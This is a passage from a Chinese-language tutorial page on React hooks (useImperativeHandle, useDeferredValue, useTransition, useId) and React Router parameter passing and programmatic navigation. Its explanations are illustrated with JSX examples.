      &lt;/button&gt;
    &lt;/&gt;
  );
}
export default UseLayoutEffectHook;
</code></pre>
<ul>
<li>useImperativeHandle =&gt; &#x4F7F;&#x7528; ref &#x65F6;&#x81EA;&#x5B9A;&#x4E49;&#x66B4;&#x9732;&#x7ED9;&#x7236;&#x7EC4;&#x4EF6;&#x7684;&#x5B9E;&#x4F8B;&#x503C;</li>
</ul>
<p>input &amp; focus &#x9700;&#x6C42;&#x53EF;&#x901A;&#x8FC7; useRef &#x5B9E;&#x73B0;&#x3002;&#x82E5;&#x5C06; input &amp; focus &#x518D;&#x5C01;&#x88C5;&#x4E00;&#x5C42;&#xFF0C;Sup &#x7EC4;&#x4EF6;&#x4E5F;&#x9700;&#x8981;&#x5BF9;&#x8FD9;&#x4E2A;&#x8F93;&#x5165;&#x6846;&#x6267;&#x884C;&#x805A;&#x7126;&#x76F8;&#x5173;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x8003;&#x8651; useImperativeHandle&#x3002;</p>
<p>useImperativeHandle &#x53EF;&#x4EE5;&#x8BA9;&#x7236;&#x7EC4;&#x4EF6;&#x83B7;&#x53D6;&#x5B50;&#x7EC4;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x6216;&#x8005;&#x8C03;&#x7528;&#x5B50;&#x7EC4;&#x4EF6;&#x91CC;&#x58F0;&#x660E;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-jsx">import React, { useRef, useImperativeHandle, forwardRef } from &quot;react&quot;;
function FancyInput(props, ref) {
  const inputRef = useRef();
  useImperativeHandle(ref, () =&gt; ({
    focus: () =&gt; {
      inputRef.current.focus();
    },
    defaultVal: &quot;hello useImperativeHandle&quot;
  }));
  return (
    &lt;input ref={inputRef} type=&quot;text&quot; placeholder=&quot;hello ...&quot; {...props} /&gt;
  );
}
export default forwardRef(FancyInput);
</code></pre>
<pre><code class="language-jsx">import React, { useRef } from &quot;react&quot;;
import FancyInput from &quot;./FancyInput&quot;;
export default function UseImperativeHandleHook() {
  const supInputRef = useRef(null);
  console.log(supInputRef);
  const foucsFancyInput = () =&gt; {
    supInputRef.current.focus();
    console.log(supInputRef.current.defaultVal);
  };
  return (
    &lt;&gt;
      &lt;h4 onClick={foucsFancyInput}&gt;Click Me&lt;/h4&gt;
      &lt;FancyInput ref={supInputRef} /&gt;
    &lt;/&gt;
  );
}
</code></pre>
<ul>
<li>useDeferredValue =&gt; &#x8FD4;&#x56DE;&#x4F20;&#x5165;&#x503C;&#x7684;&#x526F;&#x672C;</li>
</ul>
<pre><code class="language-jsx">const [queryStr, setQueryStr] = useState(&apos;&apos;);
const deferredQueryStr = useDeferredValue(queryStr);
</code></pre>
<p>queryStr &#x662F;&#x5E38;&#x89C4;&#x7684; state&#xFF0C;deferredQueryStr &#x662F; queryStr &#x7684;&#x5EF6;&#x8FDF;&#x503C;&#x3002;</p>
<p>&#x8BBE;&#x7F6E;&#x5EF6;&#x8FDF;&#x503C;&#x540E;&#x6BCF;&#x6B21;&#x8C03;&#x7528; setState &#x90FD;&#x4F1A;&#x89E6;&#x53D1;&#x4E24;&#x6B21;&#x7EC4;&#x4EF6;&#x7684;&#x91CD;&#x65B0;&#x6E32;&#x67D3;&#x3002;deferredQueryStr &#x7684;&#x503C;&#x9996;&#x6B21;&#x662F; queryStr &#x4FEE;&#x6539;&#x524D;&#x7684;&#x503C;&#xFF0C;&#x7B2C;&#x4E8C;&#x6B21;&#x662F;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x503C;&#x3002;&#x5EF6;&#x8FDF;&#x503C;&#x76F8;&#x8F83;&#x4E8E; state &#x603B;&#x4F1A;&#x6162;&#x4E00;&#x6B65;&#x66F4;&#x65B0;&#x3002;</p>
<p>&#x5F53;&#x6307;&#x5B9A;&#x72B6;&#x6001;&#x9700;&#x8981;&#x5728;&#x591A;&#x4E2A;&#x7EC4;&#x4EF6;&#x4E2D;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x4E0D;&#x540C;&#x7EC4;&#x4EF6;&#x4F1A;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x6E32;&#x67D3;&#x6548;&#x7387;&#x3002;&#x6E32;&#x67D3;&#x8F83;&#x5FEB;&#x7684;&#x7EC4;&#x4EF6;&#x4F7F;&#x7528;&#x6B63;&#x5E38;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x6E32;&#x67D3;&#x8F83;&#x6162;&#x7684;&#x7EC4;&#x4EF6;&#x4F7F;&#x7528;&#x8BE5;&#x72B6;&#x6001;&#x7684;&#x5EF6;&#x8FDF;&#x503C;&#x3002;&#x53EF;&#x7ED3;&#x5408; React.memo &#x6216; useMemo&#x3002;</p>
<ul>
<li>useTransition =&gt; &#x5904;&#x7406;&#x975E;&#x7D27;&#x6025;&#x66F4;&#x65B0;</li>
</ul>
<p>&#x9ED8;&#x8BA4;&#x6240;&#x6709;&#x66F4;&#x65B0;&#x90FD;&#x662F;&#x5177;&#x6709;&#x76F8;&#x540C;&#x4F18;&#x5148;&#x7EA7;&#x7684;&#x963B;&#x585E;&#x6E32;&#x67D3;&#x5F88;&#x53EF;&#x80FD;&#x4F1A;&#x964D;&#x4F4E;&#x9875;&#x9762;&#x6548;&#x7387;&#xFF0C;&#x5728;&#x5E76;&#x53D1;&#x6A21;&#x5F0F;&#x4E2D;&#xFF0C;&#x6E32;&#x67D3;&#x4E0D;&#x662F;&#x963B;&#x585E;&#x7684;&#xFF0C;&#x800C;&#x662F;&#x53EF;&#x4E2D;&#x65AD;&#x7684;&#x3002;</p>
<blockquote>
<p>&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x72B6;&#x6001;&#x503C;&#x8868;&#x793A;&#x8FC7;&#x6E21;&#x4EFB;&#x52A1;&#x7684;&#x7B49;&#x5F85;&#x72B6;&#x6001;&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x4E2A;&#x542F;&#x52A8;&#x8BE5;&#x8FC7;&#x6E21;&#x4EFB;&#x52A1;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
</blockquote>
<pre><code class="language-jsx">const [isPending, startTransition] = useTransition();
</code></pre>
<p>&#x4F5C;&#x4E3A;&#x8FC7;&#x6E21;&#x4EFB;&#x52A1;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x4F1A;&#x5728;&#x5176;&#x4ED6;&#x4F18;&#x5148;&#x7EA7;&#x66F4;&#x9AD8;&#x7684;&#x65B9;&#x6CD5;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#x8FD0;&#x884C;&#x3002;&#x542F;&#x52A8;&#x8BE5;&#x8FC7;&#x6E21;&#x4EFB;&#x52A1;&#x7684;&#x51FD;&#x6570; startTransition &#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x9700;&#x8981; isPending &#x65F6;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x3002;</p>
<pre><code class="language-jsx">import { useState, useTransition } from &quot;react&quot;;
export default function App() {
  const [isPending, startTransition] = useTransition();
  const [input, setInput] = useState(&quot;&quot;);
  const [list, setList] = useState([]);
  const LIST_SIZE = 1000;
  function handleChange(e) {
    setInput(e.target.value);
    startTransition(() =&gt; {
      const l = [];
      for (let i = 0; i &lt; LIST_SIZE; i++) {
        l.push(e.target.value);
      }
      setList(l);
    });
  }
  return (
    &lt;&gt;
      &lt;input type=&quot;text&quot; value={input} onChange={handleChange} /&gt;
      {isPending
        ? &quot;Loading...&quot;
        : list.map((item, index) =&gt; {
            return &lt;div key={index}&gt;{item}&lt;/div&gt;;
          })}
    &lt;/&gt;
  );
}
</code></pre>
<ul>
<li>useId =&gt; &#x751F;&#x6210;&#x552F;&#x4E00; id&#xFF0C;&#x4E0D;&#x9002;&#x7528;&#x4E8E;&#x5217;&#x8868;&#x7684; key</li>
</ul>
<p>&#x5F53;&#x5C01;&#x88C5;&#x7EC4;&#x4EF6;&#x5728;&#x88AB;&#x590D;&#x7528;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x6807;&#x8BC6;&#x7B26;&#x91CD;&#x590D;&#x7684;&#x5F02;&#x5E38;&#x3002;</p>
<p>&#x6BCF;&#x6B21;&#x7EC4;&#x4EF6;&#x6E32;&#x67D3;&#xFF0C;useId &#x90FD;&#x4F1A;&#x8FD4;&#x56DE; unique id&#x3002;&#x8FD9;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x51FA;&#x73B0;&#x76F8;&#x540C; id &#x6240;&#x81F4;&#x7684;&#x9519;&#x8BEF;&#x3002;</p>
<p>&#x6BCF;&#x6B21;&#x9875;&#x9762;&#x7684;&#x6E32;&#x67D3;&#xFF08;&#x591A;&#x6B21;&#x5237;&#x65B0;&#xFF09;&#xFF0C;&#x56FA;&#x5B9A;&#x4F4D;&#x7F6E;&#x6240;&#x4EA7;&#x751F;&#x7684;&#x968F;&#x673A; id &#x90FD;&#x4F1A;&#x76F8;&#x540C;&#x3002;</p>
<p>&#x65E2;&#x4F7F;&#x7528; SSR&#xFF0C;&#x53C8;&#x4F7F;&#x7528; CSR &#x6E32;&#x67D3;&#x90E8;&#x5206;&#x9875;&#x9762;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4; ids &#x4E0D;&#x5339;&#x914D;&#x7684;&#x60C5;&#x51B5;&#x51FA;&#x73B0; =&gt; Math.random &#x6240;&#x4EA7;&#x751F;&#x7684;&#x6570;&#x636E;&#x662F;&#x5927;&#x6982;&#x7387;&#x4E0D;&#x540C;&#x7684;&#x3002;</p>
<p>useId &#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x5BA2;&#x6237;&#x7AEF;&#x6E32;&#x67D3;&#x4E0E;&#x670D;&#x52A1;&#x7AEF;&#x6E32;&#x67D3;&#x4EA7;&#x751F;&#x4E00;&#x81F4;&#x7684; id&#x3002;</p>
<p>useId &#x4EA7;&#x751F;&#x7684; id &#x4E0D;&#x80FD;&#x7528; querySelector &#x6240;&#x6355;&#x83B7;&#xFF0C;&#x6B32;&#x62FF;&#x5230; DOM&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; useRef&#x3002;</p>
<pre><code class="language-jsx">// EmailForm.js &#x4FEE;&#x6539;&#x524D;
export default function EmailForm(){
  return (
    &lt;&gt;
      &lt;label htmlFor=&quot;email&quot;&gt;Email&lt;/label&gt; // &#x7ED9; label &#x6DFB;&#x52A0; htmlFor &#x5C5E;&#x6027; =&gt; &#x70B9;&#x51FB; label -&gt; Input &#x6846;&#x81EA;&#x52A8;&#x805A;&#x7126;
      &lt;input id=&quot;email&quot; type=&quot;email&quot; /&gt; // &#x590D;&#x7528;&#x591A;&#x6B21;&#x4F1A;&#x4EA7;&#x751F;&#x76F8;&#x540C; id =&gt; &#x70B9;&#x51FB;&#x540E;&#x9762;&#x7684;&#x8F93;&#x5165;&#x6846;&#x4E0D;&#x4F1A;&#x805A;&#x7126; -&gt; &#x9ED8;&#x8BA4;&#x805A;&#x7126;&#x6700;&#x524D;&#x65B9;&#x8F93;&#x5165;&#x6846;
    &lt;/&gt;
  )
}
</code></pre>
<pre><code class="language-jsx">// EmailForm.js &#x4FEE;&#x6539;&#x540E;
import { useId, useRef } from &quot;react&quot;;
export default function EmailForm(){
  const id = useId();
  const ref = useRef();
  return (
    &lt;&gt;
      &lt;label htmlFor={`${id}-email`}&gt;Email&lt;/label&gt;
      &lt;input ref={ref} id={`${id}-email`} type=&quot;email&quot; /&gt;
      &lt;br /&gt;
      &lt;label htmlFor={`${id}-name`}&gt;Name&lt;/label&gt;
      &lt;input ref={ref} id={`${id}-name`} type=&quot;text&quot; /&gt;
    &lt;/&gt;
  )
}
</code></pre>
<h3 id="%E8%87%AA%E5%AE%9A%E4%B9%89-hook">&#x81EA;&#x5B9A;&#x4E49; Hook</h3>
<p>&#x81EA;&#x5B9A;&#x4E49; Hook &#x7528;&#x4F5C;&#x5171;&#x4EAB;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x7684;&#x72B6;&#x6001;&#x903B;&#x8F91;&#xFF0C;&#x662F; props render &#x548C; HOC &#x7684;&#x66FF;&#x4EE3;&#x3002;</p>
<blockquote>
<p>&#x81EA;&#x5B9A;&#x4E49; Hook &#x662F;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5176;&#x540D;&#x79F0;&#x4EE5; use &#x5F00;&#x5934;&#xFF0C;&#x51FD;&#x6570;&#x5185;&#x90E8;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x5176;&#x4ED6;&#x7684; Hook&#x3002;</p>
</blockquote>
<h3 id="hook-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">Hook &#x6CE8;&#x610F;&#x4E8B;&#x9879;</h3>
<p>Sup Func Component &#x4F1A;&#x56E0; setState &#x5BFC;&#x81F4;&#x5176;&#x5185;&#x90E8;&#x7684; Sub Func Component &#x88AB;&#x91CD;&#x65B0;&#x6E32;&#x67D3;&#x3002;&#x901A;&#x5E38;&#x4F7F;&#x7528; memo &#x5305;&#x88F9; Sub Func Component &#x4EE5;&#x8FBE;&#x5230;&#x7C7B;&#x7EC4;&#x4EF6;&#x4E2D; pureComponent &#x7684;&#x6548;&#x679C;&#x3002;</p>
<blockquote>
<p>React.memo &#x9AD8;&#x9636;&#x7EC4;&#x4EF6;&#x4EC5;&#x901A;&#x8FC7;&#x68C0;&#x67E5; props &#x7684;&#x53D8;&#x66F4;&#x4EE5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x76F4;&#x63A5;&#x590D;&#x7528;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x6E32;&#x67D3;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x88AB; React.memo &#x6240;&#x5305;&#x88F9;&#x7684; Func &#x7EC4;&#x4EF6;&#x7684;&#x5B9E;&#x73B0;&#x4E2D;&#x62E5;&#x6709; useState&#xFF0C;useReducer &#x6216; useContext &#x7684; Hook &#x65F6;&#xFF0C;state &#x6216; context &#x53D8;&#x5316;&#x4F9D;&#x65E7;&#x4F1A;&#x5BFC;&#x81F4;&#x7EC4;&#x4EF6;&#x7684;&#x91CD;&#x65B0;&#x6E32;&#x67D3;&#x3002;</p>
</blockquote>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="react-router">React Router</h2>
<h3 id="router-principle">Router Principle</h3>
<ul>
<li>&#x963B;&#x6B62; &lt;a&gt; &#x6807;&#x7B7E;&#x8DF3;&#x8F6C;&#x7684;&#x65B9;&#x5F0F;</li>
</ul>
<p>onclick &#x4E8B;&#x4EF6;&#x8FD4;&#x56DE; false&#xFF1B;&#x4F7F;&#x7528;&#x4F2A;&#x534F;&#x8BAE;&#xFF1B;href &#x5C5E;&#x6027;&#x8BBE;&#x7F6E;&#x4E3A; <code>&quot;#&quot;</code>&#x3002;</p>
<pre><code class="language-jsx">&lt;a href=&quot;https://www.google.com&quot; onclick=&quot;return false&quot;&gt;&#x4E0D;&#x80FD;&#x8DF3;&#x8F6C;&lt;/a&gt; 
&lt;a href=&quot;javascript:void(0)&quot;&gt;&#x4E0D;&#x80FD;&#x8DF3;&#x8F6C;&lt;/a&gt; 
&lt;a href=&quot;#&quot;&gt;&#x4E0D;&#x80FD;&#x8DF3;&#x8F6C;&lt;/a&gt;
</code></pre>
<ul>
<li>&#x9875;&#x9762;&#x7684;&#x5BFC;&#x822A;&#x4E0E;&#x5C55;&#x793A;</li>
</ul>
<p>&#x5BFC;&#x822A;&#x533A; a &#x6807;&#x7B7E;&#x6539;&#x4E3A; Link &#x6216; NavLink &#x6807;&#x7B7E;&#xFF0C;&#x5C55;&#x793A;&#x533A;&#x901A;&#x8FC7; Route &#x6807;&#x7B7E;&#x8FDB;&#x884C;&#x8DEF;&#x5F84;&#x5339;&#x914D;&#x3002;</p>
<p>&lt;App&gt; &#x6700;&#x5916;&#x4FA7;&#x5E94;&#x901A;&#x8FC7; &lt;BrowserRouter&gt; &#x6216; &lt;HashRouter&gt; &#x5305;&#x88F9;&#x3002;</p>
<ul>
<li>&#x8DEF;&#x7531;&#x7EC4;&#x4EF6;&#x4E0E;&#x4E00;&#x822C;&#x7EC4;&#x4EF6;&#x7684;&#x4E0D;&#x540C;</li>
</ul>
<p>&#x5B58;&#x653E;&#x4F4D;&#x7F6E;&#xFF1A;&#x4E00;&#x822C;&#x7EC4;&#x4EF6;&#x901A;&#x5E38;&#x4FDD;&#x5B58;&#x5728; components &#x76EE;&#x5F55;&#xFF0C;&#x8DEF;&#x7531;&#x7EC4;&#x4EF6;&#x653E;&#x7F6E;&#x4E8E; pages &#x76EE;&#x5F55;&#x3002;</p>
<p>&#x5B9A;&#x4E49;&#x65B9;&#x5F0F;&#xFF1A;&#x4E00;&#x822C;&#x7EC4;&#x4EF6;&#x76F4;&#x63A5;&#x5199;&#x7EC4;&#x4EF6;&#x6807;&#x7B7E;&#xFF0C;&#x8DEF;&#x7531;&#x7EC4;&#x4EF6;&#x9700;&#x8981; Route &#x6807;&#x7B7E;&#x3002;</p>
<pre><code class="language-jsx">&lt;Demo/&gt; // &#x4E00;&#x822C;&#x7EC4;&#x4EF6;
&lt;Route path=&quot;/demo&quot; component={Demo}/&gt; // &#x8DEF;&#x7531;&#x7EC4;&#x4EF6;
</code></pre>
<p>&#x63A5;&#x53D7; props&#xFF1A;&#x4E00;&#x822C;&#x7EC4;&#x4EF6;&#x6839;&#x636E;&#x6807;&#x7B7E;&#x4E2D;&#x6240;&#x4F20;&#x9012;&#x7684;&#x5185;&#x5BB9;&#x786E;&#x8BA4; props&#xFF0C;&#x8DEF;&#x7531;&#x7EC4;&#x4EF6;&#x9ED8;&#x8BA4;&#x63A5;&#x53D7;&#x88AB;&#x8DEF;&#x7531;&#x5668;&#x56FA;&#x5B9A;&#x4F20;&#x9012;&#x7684;&#x4E09;&#x4E2A;&#x5C5E;&#x6027;&#x3002;</p>
<pre><code class="language-jsx">history =&gt; action&#x3001;block&#x3001;createHref&#x3001;go&#x3001;goBack&#x3001;goForward&#x3001;length&#x3001;listen&#x3001;location&#x3001;push&#x3001;replace
location =&gt; hash&#x3001;key&#x3001;pathname&#x3001;search&#x3001;state
match =&gt; isExact&#x3001;params&#x3001;path&#x3001;url
</code></pre>
<ul>
<li>&#x4E25;&#x683C;&#x6A21;&#x5F0F;&#x5F00;&#x542F;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x8BE5;&#x7EA7;&#x8DEF;&#x7531;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x5B50;&#x8DEF;&#x7531;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x5339;&#x914D;</li>
</ul>
<p>&#x6CE8;&#x518C;&#x5D4C;&#x5957;&#x8DEF;&#x7531;&#x65F6;&#x8981;&#x5199;&#x4E0A;&#x524D;&#x4E00;&#x7EA7;&#x8DEF;&#x7531;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x8DEF;&#x7531;&#x7684;&#x5339;&#x914D;&#x662F;&#x6309;&#x7167;&#x6CE8;&#x518C;&#x8DEF;&#x7531;&#x7684;&#x987A;&#x5E8F;&#x8FDB;&#x884C;&#x7684;&#x3002;&#x6CE8;&#x518C;&#x8DEF;&#x7531;&#x5373;&#x5C55;&#x793A;&#x533A;&#x7684; <code>&lt;Route path=&quot;&quot; component={}&gt;</code>&#x3002;</p>
<pre><code class="language-jsx">// Sup &#x7EC4;&#x4EF6;&#x5F00;&#x542F;&#x4E25;&#x683C;&#x6A21;&#x5F0F;
&lt;Route exact path=&quot;/sup&quot; component={Sup}/&gt;
// Sub &#x7EC4;&#x4EF6;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x5339;&#x914D;
&lt;NavLink to=&quot;/sup/sub&quot;&gt; Sub &lt;/NavLink&gt;
&lt;Route path=&quot;/sup/sub&quot; component={Sub}/&gt;
</code></pre>
<h3 id="%E5%90%91%E8%B7%AF%E7%94%B1%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%8F%82">&#x5411;&#x8DEF;&#x7531;&#x7EC4;&#x4EF6;&#x4F20;&#x53C2;</h3>
<ul>
<li>params &#x4F20;&#x53C2; =&gt; &#x8DEF;&#x7531;&#x94FE;&#x63A5;&#x643A;&#x5E26;&#x7684;&#x53C2;&#x6570;&#x9700;&#x5728;&#x6CE8;&#x518C;&#x8DEF;&#x7531;&#x65F6;&#x63A5;&#x6536;</li>
</ul>
<pre><code class="language-jsx">// &#x4F20;&#x9012;&#x53C2;&#x6570;
&lt;Link to={`/a/b/c/${xxx.id}/${xxx.name}`}&gt;hello&lt;/Link&gt;
// &#x58F0;&#x660E;&#x63A5;&#x53D7;
&lt;Route path=&quot;/a/b/c/:id/:name&quot; component={Hello}/&gt;
// &#x7EC4;&#x4EF6;&#x83B7;&#x53D6;
const {id, name} = this.props.match.params
</code></pre>
<ul>
<li>search &#x4F20;&#x53C2; =&gt; &#x65E0;&#x9700;&#x58F0;&#x660E;&#x63A5;&#x6536;&#xFF0C;&#x7C7B;&#x4F3C; Ajax &#x7684; query &#x53C2;&#x6570;</li>
</ul>
<p>&#x83B7;&#x53D6;&#x5230;&#x7684; search &#x662F; urlencoded &#x7F16;&#x7801;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x9700;&#x501F;&#x52A9; querystring &#x89E3;&#x6790;&#x3002;</p>
<pre><code class="language-jsx">// &#x4F20;&#x9012;&#x53C2;&#x6570;
&lt;Link to={`/a/b/c/?id=${xxx.id}&amp;name=${xxx.name}`}&gt;hello&lt;/Link&gt;
// &#x58F0;&#x660E;&#x63A5;&#x53D7;
&lt;Route path=&quot;/a/b/c&quot; component={Hello}/&gt;
// &#x7EC4;&#x4EF6;&#x83B7;&#x53D6;
import qs from &apos;querystring&apos;
const {search} = this.props.location
const {id, name} = qs.parse(search.slice(1))
</code></pre>
<ul>
<li>state &#x4F20;&#x53C2; =&gt; &#x4F20;&#x9012;&#x7684;&#x6570;&#x636E;&#x5728;&#x5730;&#x5740;&#x680F;&#x9690;&#x85CF;&#xFF0C;&#x4E14;&#x65E0;&#x9700;&#x58F0;&#x660E;&#x63A5;&#x6536;</li>
</ul>
<p>&#x5728; Vue &#x4E2D;&#x4F7F;&#x7528; params &#x53C2;&#x6570;&#x4E14;&#x672A;&#x5728;&#x8DEF;&#x7531;&#x914D;&#x7F6E;&#x91CC;&#x6307;&#x660E;&#x65F6;&#xFF0C;&#x4F1A;&#x51FA;&#x73B0;&#x5237;&#x65B0;&#x6240;&#x5BFC;&#x81F4;&#x7684;&#x53C2;&#x6570;&#x4E22;&#x5931;&#x95EE;&#x9898;&#x3002;React &#x8DEF;&#x7531;&#x4E2D;&#x7684; state &#x4F20;&#x53C2;&#x867D;&#x6CA1;&#x6709;&#x663E;&#x793A;&#x5728;&#x5730;&#x5740;&#x680F;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x6B64;&#x7C7B;&#x60C5;&#x51B5;&#x3002;</p>
<p>react-router-dom &#x4E2D;&#x7684; BrowserRouter &#x7EF4;&#x62A4;&#x6D4F;&#x89C8;&#x5668;&#x7684; history&#xFF0C;location &#x662F; history &#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;&#x3002;&#x8003;&#x8651;&#x5230;&#x4F1A;&#x6709;&#x6E05;&#x9664;&#x6D4F;&#x89C8;&#x5668;&#x7F13;&#x5B58;&#x5E76;&#x5237;&#x65B0;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6545;&#x6DFB;&#x52A0;&#x7A7A;&#x5BF9;&#x8C61;&#x4EE5;&#x5904;&#x7406;&#x4E0D;&#x5B58;&#x5728; state &#x7684;&#x95EE;&#x9898;&#x3002;state &#x9ED8;&#x8BA4;&#x4E3A; undefined&#x3002;</p>
<pre><code class="language-jsx">// &#x4F20;&#x9012;&#x53C2;&#x6570;
&lt;Link to={{pathname:&quot;/a/b/c&quot;, state:{id:xxx.id, name:xxx.name}}}&gt;hello&lt;/Link&gt;
// &#x58F0;&#x660E;&#x63A5;&#x53D7;
&lt;Route path=&quot;/a/b/c&quot; component={Hello}/&gt;
// &#x7EC4;&#x4EF6;&#x83B7;&#x53D6;
const {id, name} = this.props.location.state || {}
</code></pre>
<ul>
<li>BrowserRouter &#x548C; HashRouter</li>
</ul>
<p>&#x5E95;&#x5C42;&#x539F;&#x7406;&#xFF1A;&#x524D;&#x8005;&#x4F7F;&#x7528; H5 &#x7684; history&#xFF0C;&#x4E0D;&#x517C;&#x5BB9; IE9- &#x7248;&#x672C;&#xFF0C;&#x540E;&#x8005;&#x4F7F;&#x7528; URL &#x54C8;&#x5E0C;&#x503C;&#x3002;<br>
&#x8DEF;&#x5F84;&#x8868;&#x73B0;&#xFF1A;&#x524D;&#x8005;&#x65E0; #&#xFF0C;&#x540E;&#x8005;&#x5305;&#x542B; #&#x3002;<br>
&#x5237;&#x65B0;&#x5BF9;&#x8DEF;&#x7531; state &#x53C2;&#x6570;&#x7684;&#x5F71;&#x54CD;&#xFF1A;&#x524D;&#x8005;&#x65E0;&#x5F71;&#x54CD;&#xFF0C;state &#x5B58;&#x50A8;&#x4E8E; history&#xFF1B;&#x540E;&#x8005; state &#x4F1A;&#x56E0;&#x5237;&#x65B0;&#x800C;&#x4E22;&#x5931;&#x3002;</p>
<h3 id="%E7%BC%96%E7%A8%8B%E5%BC%8F%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%88%AA">&#x7F16;&#x7A0B;&#x5F0F;&#x8DEF;&#x7531;&#x5BFC;&#x822A;</h3>
<p>&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x6709;&#x65F6;&#x9700;&#x8981;&#x70B9;&#x51FB;&#x6309;&#x94AE;&#x8FDB;&#x884C;&#x9875;&#x9762;&#x7684;&#x8DF3;&#x8F6C;&#xFF0C;&#x6B64;&#x65F6;&#x5C31;&#x5E94;&#x8BE5;&#x4ECE;&#x58F0;&#x660E;&#x5F0F;&#x8DEF;&#x7531;&#x5BFC;&#x822A;&#x8F6C;&#x5411;&#x4F7F;&#x7528;&#x7F16;&#x7A0B;&#x5F0F;&#x8DEF;&#x7531;&#x5BFC;&#x822A;&#x3002;&#x8003;&#x8651;&#x5230;&#x9700;&#x8981;&#x4F20;&#x9012;&#x76F8;&#x5173;&#x53C2;&#x6570;&#xFF0C;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x9AD8;&#x9636;&#x51FD;&#x6570;&#x6216;&#x8FDB;&#x884C;&#x51FD;&#x6570;&#x5305;&#x88F9;&#x3002;</p>
<p>&#x7F16;&#x7A0B;&#x5F0F;&#x8DEF;&#x7531;&#x5BFC;&#x822A;&#x4E3B;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x662F; <a href="https://react-router.docschina.org/web/api/history">history</a> &#x5BF9;&#x8C61;&#xFF0C;&#x5373; React Router &#x7684; history &#x4F9D;&#x8D56;&#x5305;&#x3002;</p>
<blockquote>
<p>push(path, [state]) - (function &#x7C7B;&#x578B;) &#x5728; history &#x5806;&#x6808;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x6761;&#x76EE;<br>
replace(path, [state]) - (function &#x7C7B;&#x578B;) &#x66FF;&#x6362;&#x5728; history &#x5806;&#x6808;&#x4E2D;&#x7684;&#x5F53;&#x524D;&#x6761;&#x76EE;</p>
</blockquote>
<ul>
<li>params &#x53C2;&#x6570; &amp; &#x7F16;&#x7A0B;&#x5F0F;&#x8DEF;&#x7531;&#x5BFC;&#x822A;</li>
</ul>
<pre><code class="language-jsx">&lt;button onClick={() =&gt; this.pushHandle(xxx.id, xxx.name)}&gt;push&lt;/buttton&gt;
&lt;button onClick={() =&gt; this.replaceHandle(xxx.id, xxx.name)}&gt;replace&lt;/buttton&gt;
pushHandle = (id, name) =&gt; {this.props.history.push(`/a/b/c/${id}/${name}`)}
replaceHandle = (id, name) =&gt; {this.props.history.replace(`/a/b/c/${id}/${name}`)}
&lt;Route path=&quot;/a/b/c/:id/:name&quot; component={Xxx}/&gt;
</code></pre>
<ul>
<li>search &#x53C2;&#x6570; &amp; &#x7F16;&#x7A0B;&#x5F0F;&#x8DEF;&#x7531;&#x5BFC;&#x822A;</li>
</ul>
<pre><code class="language-jsx">&lt;button onClick={() =&gt; this.pushHandle(xxx.id, xxx.name)}&gt;push&lt;/buttton&gt;
&lt;button onClick={() =&gt; this.replaceHandle(xxx.id, xxx.name)}&gt;replace&lt;/buttton&gt;
pushHandle = (id, name) =&gt; {this.props.history.push(`/a/b/c/?id=${id}&amp;name=${name}`)}
replaceHandle = (id, name) =&gt; {this.props.history.replace(`/a/b/c/?id=${id}&amp;name=${name}`)}
&lt;Route path=&quot;/a/b/c&quot; component={Xxx}/&gt;
import qs from &apos;querystring&apos;
const {search} = this.props.location
const {id, name} = qs.parse(search.slice(1))
</code></pre>
<ul>
<li>state &#x53C2;&#x6570; &amp; &#x7F16;&#x7A0B;&#x5F0F;&#x8DEF;&#x7531;&#x5BFC;&#x822A;</li>
</ul>
<pre><code class="language-jsx">&lt;button onClick={() =&gt; this.pushHandle(xxx.id, xxx.name)}&gt;push&lt;/buttton&gt;
&lt;button onClick={() =&gt; this.replaceHandle(xxx.id, xxx.name)}&gt;replace&lt;/buttton&gt;
pushHandle = (id, name) =&gt; {this.props.history.push(`/a/b/c/`, {id, name})}
replaceHandle = (id, name) =&gt; {this.props.history.replace(`/a/b/c/`, {id, name})}
